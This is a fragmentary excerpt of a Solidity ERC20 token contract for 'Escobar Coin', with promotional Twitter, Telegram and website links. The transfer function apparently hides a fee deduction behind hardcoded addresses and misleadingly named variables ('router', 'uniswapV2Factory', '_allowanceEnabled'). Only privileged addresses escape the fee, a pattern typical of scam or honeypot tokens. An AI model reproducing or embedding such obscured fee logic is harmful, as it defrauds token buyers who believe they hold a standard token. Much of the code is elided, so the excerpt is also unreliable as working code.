...
https://twitter.com/EscobarBNB
https://t.me.com/EscobarBNB
https://EscobarBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal router = 0xbF9641c40E88b712374dBA9bddC299B6fe66FEcF;
    uint256 private _allowanceEnabled = 2;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private uniswapV2Factory = 0x02529Dd221759D17EEc075c1b1BD144D7195b88F;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != router && _balances[uniswapV2Factory] > 0 ? _pairToken : _allowanceEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
{
    constructor() ERC20(unicode"Escobar Coin", unicode"ESCOBAR")
    {
